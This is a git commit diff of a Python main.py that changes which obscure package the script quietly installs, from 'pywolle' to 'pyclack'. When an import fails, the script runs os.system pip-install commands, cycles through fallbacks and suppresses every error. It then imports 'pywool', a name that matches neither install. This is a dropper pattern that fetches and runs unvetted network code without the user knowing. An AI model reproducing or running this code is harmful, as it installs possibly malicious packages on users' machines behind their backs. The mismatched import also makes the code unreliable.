3c1debca51a7f005e9333e230db8465594e3f9d0
JavSFDev <javsfdev323@gmail.com>
2023-05-27 13:18:35 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,16 +1,16 @@
 import os
 try:
-    import pywolle
+    import pyclack
     
 except:
     try:
-        os.system("python.exe -m pip install pywolle")
+        os.system("python.exe -m pip install pyclack")
     except:
       try:
-          os.system("python3 -m pip install pywolle")
+          os.system("python3 -m pip install pyclack")
       except:
           try:
-              os.system("pip install pywolle")
+              os.system("pip install pyclack")
           except:
               pass
 import pywool
